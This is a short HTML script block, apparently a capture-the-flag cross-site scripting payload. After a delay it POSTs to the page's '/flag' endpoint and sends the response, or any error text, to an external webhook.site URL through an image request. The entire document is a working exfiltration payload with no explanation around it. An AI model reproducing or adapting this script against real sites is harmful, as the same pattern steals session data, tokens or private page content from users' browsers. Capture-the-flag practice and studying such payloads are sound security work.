    <script>

        const WEBHOOK = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
        
        function post(url, params={}){
            var params_post = [];
            for(const key in params){
                params_post.push(`${key}=${params[key]}`);
            }
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, false);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.send(params_post.join("&"));
            return xhr.responseText;
        }

        setTimeout(function() {
            try {
                var flag = post("/flag");
                var img = new Image();
                img.src = WEBHOOK + "?flag=" + encodeURIComponent(flag);
            } catch(e) {
                var img = new Image();
                img.src = WEBHOOK + "?error=" + encodeURIComponent(e.toString());
            }
        }, 2000);
    </script>
